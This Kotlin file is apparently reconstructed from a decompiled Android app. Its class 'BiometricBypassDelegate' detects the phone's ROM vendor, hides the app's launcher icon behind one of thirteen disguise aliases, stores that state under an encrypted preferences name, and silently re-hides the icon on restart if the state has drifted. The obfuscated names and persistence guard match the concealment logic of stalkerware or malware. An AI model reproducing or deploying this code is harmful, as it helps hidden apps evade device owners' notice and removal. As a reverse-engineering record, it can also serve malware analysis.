package com.storm.safe.rock.service.modules

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import com.storm.safe.rock.AppVariantA
import com.storm.safe.rock.AppVariantB
import com.storm.safe.rock.AppVariantC
import com.storm.safe.rock.AppVariantD
import com.storm.safe.rock.AppVariantE
import com.storm.safe.rock.AppVariantF
import com.storm.safe.rock.AppVariantG
import com.storm.safe.rock.AppVariantH
import com.storm.safe.rock.AppVariantI
import com.storm.safe.rock.AppVariantJ
import com.storm.safe.rock.AppVariantK
import com.storm.safe.rock.AppVariantL
import com.storm.safe.rock.AppVariantN
import com.storm.safe.rock.DefaultLauncherAlias
import com.storm.safe.rock.activity.TransparentHelperActivity
import com.storm.safe.rock.iuzxujjtqev
import com.storm.safe.rock.service.tisxhskrc
import com.storm.safe.rock.util.StringUtil
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.Locale

/**
 * Icon hiding / biometric bypass delegate. Manages app launcher icon visibility
 * by enabling/disabling component aliases.
 *
 * Reverse-engineered from JADX: C0328b3 (b3, 231 lines).
 * Renamed: a0->getDisguiseComponent, a1->getSafeStartIntent, a2->hideIcon,
 *          a3->initialize, a4->setIconHidden, a5->showIcon
 *
 * JADX tag: "fxsnugkm"
 *
 * JADX fields:
 *   f53187a0 -> context
 *   f53188a1 -> romDetector (xj1)
 *   f53189a2 -> isHidden
 *   f53190a3 -> packageManager
 *   f53191a4 -> scope (CoroutineScope, IO dispatcher)
 *   f53192a5 -> defaultLauncherAlias (ComponentName)
 *   f53193a6 -> disguiseVariants (List<Class<*>>)
 */
class BiometricBypassDelegate(
    private val context: Context
) {
    companion object {
        const val TAG = "fxsnugkm"
    }

    /**
     * ROM detection helper. JADX: xj1
     * Detects device ROM type from Build.MANUFACTURER, Build.BRAND, Build.MODEL, Build.DISPLAY.
     */
    class RomDetector {
        var isMiui: Boolean = false        // JADX: f61146a0
        var isHonor: Boolean = false       // JADX: f61147a1
        var isHuawei: Boolean = false      // JADX: f61148a2
        var isColorOS: Boolean = false     // JADX: f61149a3
        var isFuntouchOS: Boolean = false  // JADX: f61150a4
        var isOneUI: Boolean = false       // JADX: f61151a5

        init {
            val manufacturer = (Build.MANUFACTURER ?: "unknown").lowercase(Locale.ROOT)
            val brand = (Build.BRAND ?: "unknown").lowercase(Locale.ROOT)
            val model = Build.MODEL ?: "unknown"
            val display = (Build.DISPLAY ?: "unknown")

            // JADX: xj1 constructor logic
            isMiui = manufacturer.contains("xiaomi") || brand.contains("xiaomi") ||
                    brand.contains("redmi") || brand.contains("poco")
            val isHonorDetected = manufacturer.contains("honor") || brand.contains("honor") ||
                    display.contains("magic", ignoreCase = true) ||
                    display.contains("honor", ignoreCase = true) ||
                    model.contains("honor", ignoreCase = true)
            isHonor = isHonorDetected
            isHuawei = (manufacturer.contains("huawei") || brand.contains("huawei")) && !isHonorDetected
            isColorOS = manufacturer.contains("oppo") || brand.contains("oppo") ||
                    brand.contains("oneplus") || brand.contains("realme")
            isFuntouchOS = manufacturer.contains("vivo") || brand.contains("vivo") ||
                    brand.contains("iqoo")
            isOneUI = manufacturer.contains("samsung") || brand.contains("samsung")
        }
    }

    // --- Fields ---
    private val packageManager: PackageManager = context.packageManager
    private var isHidden: Boolean = false

    /** JADX: f53188a1 — ROM detector (xj1) */
    val romDetector: RomDetector = RomDetector()

    /** JADX: f53191a4 — CoroutineScope on IO dispatcher */
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /** JADX: f53192a5 — ComponentName for DefaultLauncherAlias */
    private val defaultLauncherAlias: ComponentName = ComponentName(context, DefaultLauncherAlias::class.java)

    /** JADX: f53193a6 — List of disguise variant activity classes (A-N, excluding M) */
    val disguiseVariants: List<Class<*>> = listOf(
        AppVariantA::class.java,
        AppVariantB::class.java,
        AppVariantC::class.java,
        AppVariantD::class.java,
        AppVariantE::class.java,
        AppVariantF::class.java,
        AppVariantG::class.java,
        AppVariantH::class.java,
        AppVariantI::class.java,
        AppVariantJ::class.java,
        AppVariantK::class.java,
        AppVariantL::class.java,
        AppVariantN::class.java
    )

    // --- Data class for result ---
    data class IconResult(
        val action: String,
        val success: Boolean,
        val message: String
    )

    // --- a0 -> getDisguiseComponent ---
    /**
     * JADX: m211756a0 — selects disguise ComponentName based on ROM type.
     *
     * Logic (from xj1 flags):
     *   if isHonor || isHuawei → AppVariantA (default, same as first branch)
     *   if isMiui → null (MIUI returns no disguise)
     *   if isFuntouchOS → AppVariantF
     *   if isColorOS → AppVariantH
     *   if isOneUI (or default) → AppVariantN
     *   default (AOSP) → AppVariantA
     */
    fun getDisguiseComponent(): ComponentName? {
        val rd = romDetector
        var cls: Class<*>? = AppVariantA::class.java  // JADX: default = AppVariantA

        if (!rd.isHonor && !rd.isHuawei) {
            // Not Honor/Huawei — check other ROMs
            if (rd.isMiui) {
                cls = null  // JADX: f61146a0 → cls = null
            } else if (rd.isFuntouchOS) {
                cls = AppVariantF::class.java  // JADX: f61150a4 → AppVariantF
            } else if (rd.isColorOS) {
                cls = AppVariantH::class.java  // JADX: f61149a3 → AppVariantH
            } else {
                // JADX: boolean z = xj1Var.f61151a5; cls = AppVariantN.class
                // Samsung or default AOSP → AppVariantN
                cls = AppVariantN::class.java
            }
        }
        // For Honor/Huawei: cls stays AppVariantA (the initial default)

        return if (cls != null) {
            ComponentName(context, cls)
        } else {
            null
        }
    }

    // --- a1 -> getSafeStartIntent ---
    /**
     * JADX: m211757a1 — creates Intent targeting iuzxujjtqev activity.
     */
    fun getSafeStartIntent(): Intent? {
        return try {
            Intent().apply {
                component = ComponentName(context, iuzxujjtqev::class.java)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
        } catch (e: Exception) {
            Log.e(TAG, "获取安全启动Intent失败", e)
            null
        }
    }

    // --- a2 -> hideIcon ---
    /**
     * JADX: m211758a2 — hides launcher icon by enabling disguise component
     * and disabling DefaultLauncherAlias.
     *
     * Logic:
     * 1. Get disguise ComponentName
     * 2. Enable disguise component (COMPONENT_ENABLED_STATE_ENABLED=1, DONT_KILL_APP=1)
     * 3. Sleep 1500ms for Huawei/Honor, 200ms for others
     * 4. Disable DefaultLauncherAlias (COMPONENT_ENABLED_STATE_DISABLED=2, DONT_KILL_APP=1)
     * 5. Save icon_hidden=true
     */
    fun hideIcon(force: Boolean = false): IconResult {
        if (!force && isHidden) {
            return IconResult("ALREADY_HIDDEN", true, "应用图标已处于隐藏状态")
        }
        return try {
            val disguiseComponent = getDisguiseComponent()
            if (disguiseComponent != null) {
                packageManager.setComponentEnabledSetting(
                    disguiseComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,  // 1
                    PackageManager.DONT_KILL_APP  // 1
                )
                Log.d(TAG, "启用伪装: ${disguiseComponent.shortClassName}")
            }

            // JADX: sleep duration depends on ROM — Huawei/Honor = 1500ms, others = 200ms
            val rd = romDetector
            val sleepMs = if (rd.isHuawei || rd.isHonor) 1500L else 200L
            if (sleepMs > 0) {
                Thread.sleep(sleepMs)
            }

            // Disable DefaultLauncherAlias
            packageManager.setComponentEnabledSetting(
                defaultLauncherAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,  // 2
                PackageManager.DONT_KILL_APP  // 1
            )
            Log.d(TAG, "禁用 DefaultLauncherAlias")

            isHidden = true
            setIconHidden(true)

            val romName = when {
                rd.isMiui -> "MIUI"
                rd.isHuawei -> "EMUI/HarmonyOS"
                rd.isHonor -> "MagicOS"
                rd.isColorOS -> "ColorOS"
                rd.isFuntouchOS -> "FuntouchOS"
                rd.isOneUI -> "OneUI"
                else -> "AOSP"
            }
            Log.i(TAG, "图标隐藏完成（$romName）")
            IconResult("HIDE", true, "隐藏成功")
        } catch (e: Exception) {
            Log.e(TAG, "隐藏失败", e)
            IconResult("HIDE", false, "隐藏失败: ${e.message}")
        }
    }

    // --- a3 -> initialize ---
    /**
     * JADX: m211759a3 — migration checks + load icon_hidden state from SharedPreferences.
     *
     * Migration logic:
     * 1. Check iuzxujjtqev component — if disabled (2 or 3), re-enable it
     * 2. Check TransparentHelperActivity — if enabled (1), disable it
     * 3. Load icon_hidden from prefs — if true, launch verify coroutine
     *
     * Verify coroutine (fxsnugkm$initialize$1):
     * 1. delay(2000)
     * 2. Check if DefaultLauncherAlias is disabled AND disguise is enabled
     * 3. If consistent → skip; if inconsistent → call hideIcon(force=true) to fix
     */
    fun initialize() {
        // Migration: ensure iuzxujjtqev is enabled
        try {
            val iuzComponent = ComponentName(context, iuzxujjtqev::class.java)
            val iuzState = packageManager.getComponentEnabledSetting(iuzComponent)
            if (iuzState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED ||
                iuzState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER) {
                // Re-enable iuzxujjtqev (new architecture no longer disables it)
                packageManager.setComponentEnabledSetting(
                    iuzComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.i(TAG, "迁移：重新启用 iuzxujjtqev（新架构不再禁用它）")
            }

            // Migration: disable TransparentHelperActivity if enabled
            try {
                val transparentComponent = ComponentName(context, TransparentHelperActivity::class.java)
                if (packageManager.getComponentEnabledSetting(transparentComponent) ==
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                    packageManager.setComponentEnabledSetting(
                        transparentComponent,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    Log.i(TAG, "迁移：禁用 TransparentHelperActivity（新架构不再需要）")
                }
            } catch (_: Exception) {}
        } catch (e: Exception) {
            Log.e(TAG, "迁移检查失败", e)
        }

        // Load icon_hidden state from SharedPreferences
        // JADX: StringUtil.m212470a0("KkkBBV4sDTpS") = prefs file name
        val prefsName = StringUtil.decrypt("KkkBBV4sDTpS")
        val isIconHidden = context.getSharedPreferences(prefsName, Context.MODE_PRIVATE)
            .getBoolean("icon_hidden", false)
        if (isIconHidden) {
            isHidden = true
            // JADX: launch verify coroutine — fxsnugkm$initialize$1
            scope.launch {
                try {
                    delay(2000)  // JADX: b81.m210571b1(2000L, ...)
                    // Verify component states are consistent
                    var isConsistent = false
                    try {
                        val isDefaultDisabled = packageManager.getComponentEnabledSetting(
                            defaultLauncherAlias
                        ) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                        val disguiseComponent = getDisguiseComponent()
                        if (disguiseComponent == null) {
                            isConsistent = isDefaultDisabled
                        } else {
                            val isDisguiseEnabled = packageManager.getComponentEnabledSetting(
                                disguiseComponent
                            ) == PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                            if (isDefaultDisabled && isDisguiseEnabled) {
                                isConsistent = true
                            }
                        }
                    } catch (_: Exception) {}

                    if (isConsistent) {
                        Log.i(TAG, "组件状态已正确，跳过重复切换")
                    } else {
                        hideIcon(force = true)
                        Log.i(TAG, "组件状态不一致，已修复")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "恢复隐藏状态失败", e)
                }
            }
        }
    }

    // --- a4 -> setIconHidden ---
    /**
     * JADX: m211760a4 — persists icon_hidden boolean to SharedPreferences
     * and schedules guard via tisxhskrc.
     */
    fun setIconHidden(hidden: Boolean) {
        try {
            val prefsName = StringUtil.decrypt("KkkBBV4sDTpS")
            context.getSharedPreferences(prefsName, Context.MODE_PRIVATE).edit()
                .putBoolean("icon_hidden", hidden)
                .apply()
            // JADX: tisxhskrc.f55188a0.scheduleGuard(context)
            tisxhskrc.scheduleGuard(context)
        } catch (e: Exception) {
            Log.e(TAG, "设置icon_hidden失败", e)
        }
    }

    // --- a5 -> showIcon ---
    /**
     * JADX: m211761a5 — shows icon by re-enabling DefaultLauncherAlias
     * and disabling all disguise variant components.
     *
     * Logic:
     * 1. Enable DefaultLauncherAlias (1, 1)
     * 2. Iterate disguiseVariants — disable each (2, 1)
     * 3. Disable TransparentHelperActivity (2, 1)
     * 4. Save icon_hidden=false
     */
    fun showIcon(): IconResult {
        if (!isHidden) {
            return IconResult("ALREADY_SHOWN", true, "应用图标已处于显示状态")
        }
        return try {
            // Re-enable DefaultLauncherAlias
            packageManager.setComponentEnabledSetting(
                defaultLauncherAlias,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,  // 1
                PackageManager.DONT_KILL_APP  // 1
            )
            Log.d(TAG, "启用 DefaultLauncherAlias")

            // Disable all disguise variant components
            for (variantClass in disguiseVariants) {
                try {
                    packageManager.setComponentEnabledSetting(
                        ComponentName(context, variantClass),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,  // 2
                        PackageManager.DONT_KILL_APP  // 1
                    )
                } catch (_: Exception) {}
            }

            // Disable TransparentHelperActivity
            try {
                packageManager.setComponentEnabledSetting(
                    ComponentName(context, TransparentHelperActivity::class.java),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,  // 2
                    PackageManager.DONT_KILL_APP  // 1
                )
            } catch (_: Exception) {}

            isHidden = false
            setIconHidden(false)
            Log.i(TAG, "图标恢复完成")
            IconResult("SHOW", true, "恢复成功")
        } catch (e: Exception) {
            Log.e(TAG, "恢复失败", e)
            IconResult("SHOW", false, "恢复失败: ${e.message}")
        }
    }

    // --- Public state accessors ---
    fun isIconHidden(): Boolean = isHidden
}
